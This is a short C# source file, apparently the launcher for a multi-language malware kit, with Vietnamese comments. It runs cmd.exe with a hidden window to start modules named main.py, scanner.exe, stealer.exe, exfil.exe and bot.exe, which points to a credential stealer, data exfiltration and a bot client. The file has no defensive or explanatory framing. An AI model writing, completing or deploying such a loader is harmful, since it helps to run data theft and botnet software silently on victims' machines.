// ============================================================
// loader.cs - C# Loader (Chạy tất cả modules)
// Compile: csc /target:exe /optimize+ loader.cs
// ============================================================

using System;
using System.Diagnostics;

class Loader
{
    static void RunCommand(string cmd)
    {
        Process.Start(new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/c " + cmd,
            CreateNoWindow = true,
            UseShellExecute = false
        });
    }
    
    static void Main()
    {
        Console.WriteLine("[*] Loading all modules...");
        
        // Chạy Python
        RunCommand("python main.py");
        
        // Chạy C++
        RunCommand("scanner.exe");
        
        // Chạy Rust
        RunCommand("stealer.exe");
        
        // Chạy Nim
        RunCommand("exfil.exe");
        
        // Chạy Go
        RunCommand("bot.exe");
        
        Console.WriteLine("[+] All modules executed!");
    }
}